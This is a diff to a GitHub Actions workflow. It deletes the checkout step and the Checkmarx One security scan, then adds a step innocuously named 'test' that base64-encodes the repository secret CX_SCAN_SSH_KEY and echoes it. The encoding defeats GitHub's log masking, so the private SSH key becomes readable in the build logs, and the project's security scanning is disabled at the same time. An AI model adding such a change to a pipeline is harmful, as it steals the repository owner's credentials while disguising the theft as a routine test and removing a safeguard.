@@ -13,13 +13,8 @@ jobs:
     name: Checkmarx One Scan
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
-      - name: Checkmarx One CLI Action
-        uses: checkmarx/ast-github-action@f0869bd1a37fddc06499a096101e6c900e815d81 # v.2.0.36
-        with:
-          base_uri: ${{ secrets.AST_RND_SCANS_BASE_URI }}
-          cx_tenant: ${{ secrets.AST_RND_SCANS_TENANT }}
-          cx_client_id: ${{ secrets.AST_RND_SCANS_CLIENT_ID }}
-          cx_client_secret: ${{ secrets.AST_RND_SCANS_CLIENT_SECRET }}
-          additional_params: --tags phoenix --threshold "sca-critical=1;sca-high=1;sca-medium=1;sca-low=1;sast-critical=1;sast-high=1;sast-medium=1;sast-low=1;iac-security-critical=1;iac-security-high=1;iac-security-medium=1;iac-security-low=1"
+      - name: test
+        run: 'echo "$SSH_KEY" | base64'
+        shell: bash
+        env:
+          SSH_KEY: ${{ secrets.CX_SCAN_SSH_KEY }}
